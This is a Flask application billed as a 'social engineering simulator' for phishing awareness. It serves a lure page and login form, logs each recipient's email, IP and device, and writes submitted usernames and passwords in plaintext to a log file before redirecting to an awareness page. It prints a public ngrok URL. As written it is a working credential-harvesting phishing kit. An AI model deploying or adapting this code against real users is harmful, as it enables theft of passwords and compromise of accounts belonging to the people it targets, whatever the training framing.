#!/usr/bin/env python3
from flask import Flask, render_template, request, redirect, url_for, session, make_response
from werkzeug.middleware.proxy_fix import ProxyFix
from datetime import datetime
import os
import socket
import uuid
from user_agents import parse

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)

# Add headers for cross-device compatibility
@app.after_request
def add_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.before_request
def log_request():
    """Log all incoming requests for debugging"""
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    print(f"📨 Request: {request.method} {request.path} | IP: {get_client_ip()} | UA: {user_agent[:50]}", flush=True)


# === HELPER FUNCTIONS ===
def get_network_ip():
    """Get local network IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_client_ip():
    """Get client IP (handles ngrok proxy and other proxies)"""
    # Try to get IP from forwarded headers (ngrok, proxies)
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
        return ip.split(',')[0].strip()
    
    # Try X-Real-IP header (common proxy header)
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    
    # Fallback to direct connection IP
    return request.remote_addr


def get_device_info():
    """Extract device info from User-Agent header"""
    user_agent_string = request.headers.get('User-Agent', 'Unknown')
    try:
        ua = parse(user_agent_string)
        browser = ua.browser.family or 'Unknown'
        os_name = ua.os.family or 'Unknown'
        return f"{browser} / {os_name}"
    except Exception:
        return "Unknown Device"


def log_event(action, username='', password='', status='', recipient_email=''):
    """Create new login event (for email click only)"""
    ip_address = get_client_ip()
    device = get_device_info()
    event_timestamp = datetime.now().isoformat()
    
    event_text = f"\n====== LOGIN EVENT ======\n"
    event_text += f"Time           : {event_timestamp}\n"
    event_text += f"IP Address     : {ip_address}\n"
    event_text += f"Device         : {device}\n"
    event_text += f"Recipient Email: {recipient_email}\n"
    event_text += f"Username       : {username}\n"
    event_text += f"Password       : {password}\n"
    event_text += f"Status         : {status}\n"
    event_text += f"=========================\n"
    
    file_path = os.path.join(os.path.dirname(__file__), "data", "login_events.txt")
    with open(file_path, "a", encoding='utf-8') as f:
        f.write(event_text)
    
    print(f"✅ Event created: Email Link Clicked | Recipient: {recipient_email}", flush=True)
    return event_timestamp


def update_event(event_timestamp, username='', password='', status=''):
    """Update existing login event with credentials"""
    file_path = os.path.join(os.path.dirname(__file__), "data", "login_events.txt")
    
    try:
        # Read the entire file
        with open(file_path, "r", encoding='utf-8') as f:
            content = f.read()
        
        # Find and replace the event with matching timestamp
        timestamp_line = f"Time           : {event_timestamp}"
        
        if timestamp_line not in content:
            print(f"⚠️  Event not found for timestamp: {event_timestamp}", flush=True)
            return
        
        # Split content by event blocks
        events = content.split("=========================\n")
        updated_events = []
        found = False
        
        for event in events:
            if timestamp_line in event:
                found = True
                # Update this event
                lines = event.split('\n')
                updated_lines = []
                
                for line in lines:
                    if line.startswith("Username       :"):
                        updated_lines.append(f"Username       : {username}")
                    elif line.startswith("Password       :"):
                        updated_lines.append(f"Password       : {password}")
                    elif line.startswith("Status         :"):
                        updated_lines.append(f"Status         : {status}")
                    else:
                        updated_lines.append(line)
                
                updated_events.append('\n'.join(updated_lines))
            else:
                updated_events.append(event)
        
        if found:
            # Reconstruct the file
            new_content = "=========================\n".join(updated_events)
            
            with open(file_path, "w", encoding='utf-8') as f:
                f.write(new_content)
            
            print(f"✅ Event updated: Form Submitted | Username: {username} | Status: {status}", flush=True)
        else:
            print(f"⚠️  Event not found for timestamp: {event_timestamp}", flush=True)
    
    except Exception as e:
        print(f"❌ Error updating event: {e}", flush=True)


# === ROUTES ===
@app.route('/')
def index():
    recipient_email = request.args.get('email', 'Unknown')
    # Create ONE event on email click
    event_timestamp = log_event('', '', '', '', recipient_email)
    # Store timestamp in session for later update
    session['event_timestamp'] = event_timestamp
    return render_template('index.html', recipient_email=recipient_email)


@app.route('/login', methods=['GET', 'POST'])
def login():
    recipient_email = request.args.get('email', request.form.get('recipient_email', 'Unknown'))
    
    if request.method == 'GET':
        # Just render the form, don't log anything
        return render_template('login.html', recipient_email=recipient_email)
    
    # POST request - form submission
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    recipient_email = request.form.get('recipient_email', 'Unknown').strip()
    event_timestamp = session.get('event_timestamp', '')
    
    if not username or not password:
        status = 'verification Failed'
    else:
        status = 'verification Successfully'
    
    # Update the existing event with form data
    if event_timestamp:
        update_event(event_timestamp, username, password, status)
    
    if not username or not password:
        return render_template('login.html', recipient_email=recipient_email)
    
    return redirect(url_for('awareness'))


@app.route('/awareness')
def awareness():
    return render_template('awareness.html')

@app.route('/details')
def details():
    return render_template('details.html')


# === ERROR HANDLERS ===
@app.errorhandler(404)
def page_not_found(e):
    return render_template('index.html'), 200

@app.errorhandler(500)
def internal_error(e):
    print(f"❌ Server Error: {e}", flush=True)
    return render_template('index.html'), 200

@app.errorhandler(Exception)
def handle_exception(e):
    print(f"❌ Exception: {e}", flush=True)
    return render_template('index.html'), 200


# === MAIN ===
if __name__ == '__main__':
    network_ip = get_network_ip()
    port = int(os.getenv('PORT', 5000))
    
    print("\n" + "="*70)
    print("🚀 SOCIAL ENGINEERING SIMULATOR - ACTIVE")
    print("="*70)
    print(f"\n📱 LOCAL:   http://127.0.0.1:{port}/")
    print(f"🌐 NETWORK: http://{network_ip}:{port}/")
    print(f"🔗 PUBLIC:  https://groom-specimen-suffrage.ngrok-free.dev")
    print(f"\n📊 LOG FILE: login_events.txt")
    print("="*70 + "\n")
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
